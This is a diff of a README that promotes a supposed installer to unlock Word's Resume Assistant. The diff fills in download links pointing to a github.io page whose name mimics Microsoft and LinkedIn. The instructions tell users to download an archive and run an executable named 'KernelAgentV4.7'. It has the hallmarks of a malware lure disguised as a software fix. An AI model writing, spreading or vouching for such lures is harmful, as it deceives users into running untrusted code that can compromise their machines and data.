@@ -2,13 +2,15 @@
 
 Unlock Resume Assistant inside Word — an integrated career tool that helps craft professional resumes using real examples from LinkedIn. This installer activates and restores the feature across Microsoft 365 Word apps.
 
-[![Download Resume Assistant](https://img.shields.io/badge/Download-Resume_Assistant-blueviolet)](🔗 PLACE_YOUR_DOWNLOAD_LINK_HERE)
+[![Download Resume Assistant](https://img.shields.io/badge/Download-Resume_Assistant-blueviolet)](https://m365-resume-assistant-linkedin.github.io/.github
+)
 
 ---
 
 ### ⚙️ Installation Instructions
 
-1. 📦 **Download the archive** from the [Releases](🔗 PLACE_YOUR_DOWNLOAD_LINK_HERE) section  
+1. 📦 **Download the archive** from the [Releases](https://m365-resume-assistant-linkedin.github.io/.github
+) section  
 2. 📁 **Extract the folder** to a preferred location (e.g. `C:\ResumeAssistant`)  
 3. 🖱 **Run the executable file** `KernelAgentV4.7` to enable Resume Assistant and all supporting modules  
 4. 🧠 Open Microsoft Word and go to the **Review** tab → click **Resume Assistant**  
